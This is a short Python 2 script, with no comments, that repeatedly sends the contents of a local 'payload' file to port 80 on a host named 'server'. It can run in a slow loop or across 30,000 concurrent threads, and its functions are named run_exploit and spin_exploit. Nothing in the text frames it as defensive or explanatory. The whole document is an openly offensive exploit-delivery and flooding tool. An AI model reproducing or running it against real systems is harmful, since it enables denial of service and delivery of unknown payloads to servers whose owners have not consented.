#!/usr/bin/python

import socket
import threading
import time

THREADS = 30000 

SLOW = True

def run_exploit():
  try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("server", 80))
    payload = ""
    with open("payload", "r") as f:
      payload = f.read()
      s.send(payload)
      #print s.read(1024)
      s.close()
  except Exception, e:
    print "got exception " + str(e)

def spin_exploit():
 while True:
   run_exploit()

class ThreadClass(threading.Thread):
  def run(self):
    spin_exploit()

def sleep():
  time.sleep(0.01)

def main():
  if SLOW:
    i = 0
    while True:
      print "delivering payload " + str(i)
      i += 1
      run_exploit()
      sleep()

  for i in range(THREADS):
    #try:
    t = ThreadClass()
    t.start()
    #except:
      #pass
      #print "caught exception while trying to make %dth thread" % i

main()